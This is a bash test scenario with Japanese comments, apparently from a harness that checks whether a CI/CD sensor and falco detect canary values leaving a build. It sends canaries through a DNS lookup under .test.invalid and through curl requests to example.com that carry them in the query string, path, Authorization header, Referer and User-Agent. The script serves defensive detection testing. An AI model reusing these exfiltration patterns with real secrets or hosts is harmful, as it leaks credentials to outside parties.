#!/usr/bin/env bash
#
# scenarios/02-exfil.sh
#
# 用途:
#   外部送信経路ごとに、どの経路でカナリア値が「見える」状態になるかを
#   切り分ける。DNS ラベル、平文 HTTP のクエリ文字列、平文 HTTP のパス、
#   平文 HTTP の Authorization ヘッダ、そして対照群としての HTTPS を
#   それぞれ試す。
#
# 安全性 (docs/SPEC.md 1節を厳守):
#   通信先は次の2つのみ。
#     - DNS: `<CANARY_DNS>.test.invalid` (RFC 2606 予約 TLD。解決されない
#       ことが正常。第三者には到達しない)
#     - HTTP/HTTPS: `example.com` (IANA 予約ドメイン。POST 相当の内容も
#       送信しない。GET のみで、送る内容はクエリ文字列 / パス /
#       ヘッダに限る)
#   webhook 収集サービスや攻撃者インフラは一切使わない。
#
# 期待される検知内容:
#   cicd-sensor の `domain` イベント (CANARY_DNS)、`http_request` イベント
#   (CANARY_URL_PATH は payload.path に残る想定、CANARY_URL_QUERY は
#   query string 除去により残らない想定)。falco 側は process_exec /
#   network_connect 相当のイベントで curl / getent の実行と接続先を記録する
#   想定。HTTPS の対照群は「中身が取れないこと」の確認用。
#
# CANARY_ARGV_SHORT / CANARY_ARGV_LONG の注入について (docs/SPEC.md 4節、
# レビューで見つかった仕様の穴への対応):
#   以前はこの2つの値がどのシナリオでも argv に注入されておらず、
#   「argv にカナリアを埋めても記録されない」という報告の真因が
#   実際にはそもそも argv に載せていなかったことだった。ここで
#   `--referer` / `-A` という無害な curl オプションの引数として、
#   カナリアの値をそのまま**独立した argv 要素**として渡す
#   (クエリ文字列やヘッダ値の一部として埋め込むのではなく、
#   その値だけで1つの argv 配列要素になる形)。これにより
#   「12 バイト以下の argv は切り詰められない」
#   (CANARY_ARGV_SHORT) / 「13 バイト以上は `<truncated, N bytes>`
#   になる」(CANARY_ARGV_LONG) という仮説を、argv 要素の境界に
#   依存せずに検証できる。通信先は他のステップと同じ
#   `http://example.com/` のみ。

set -uo pipefail

SCENARIO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "${SCENARIO_DIR}/lib/common.sh"

load_canaries

step "DNS lookup of canary label under *.test.invalid (resolution failure is expected)"
safe_run getent hosts "${CANARY_DNS}.test.invalid"
end_step

step "plaintext HTTP with canary in query string"
safe_run curl -s -m 5 -o /dev/null "http://example.com/?t=${CANARY_URL_QUERY}"
end_step

step "plaintext HTTP with canary in path"
safe_run curl -s -m 5 -o /dev/null "http://example.com/${CANARY_URL_PATH}"
end_step

step "plaintext HTTP with canary in Authorization header"
safe_run curl -s -m 5 -o /dev/null \
  -H "Authorization: Bearer ${CANARY_ARGV_FLAG}" \
  "http://example.com/"
end_step

step "plaintext HTTP with argv canaries as independent argv elements (CANARY_ARGV_SHORT / CANARY_ARGV_LONG)"
# CANARY_ARGV_SHORT / CANARY_ARGV_LONG は curl のオプション引数として渡す。
# `--referer VALUE` / `-A VALUE` はそれぞれ VALUE がクエリ文字列やヘッダの
# 一部ではなく、それ自体で1つの argv 配列要素になる (bash の単語分割により
# curl の実プロセスの argv では "--referer" と "${CANARY_ARGV_SHORT}" が
# 別々の要素として execve に渡る)。値そのものは無害な Referer / User-Agent
# として送られるだけで、実際の通信先・内容は他のステップと同じ
# http://example.com/ のみ。
safe_run curl -s -m 5 -o /dev/null \
  --referer "${CANARY_ARGV_SHORT}" \
  -A "${CANARY_ARGV_LONG}" \
  "http://example.com/"
end_step

step "HTTPS control group (canary in query string; must NOT be observable in cleartext)"
safe_run curl -s -m 5 -o /dev/null "https://example.com/?t=${CANARY_URL_QUERY}"
end_step

exit 0
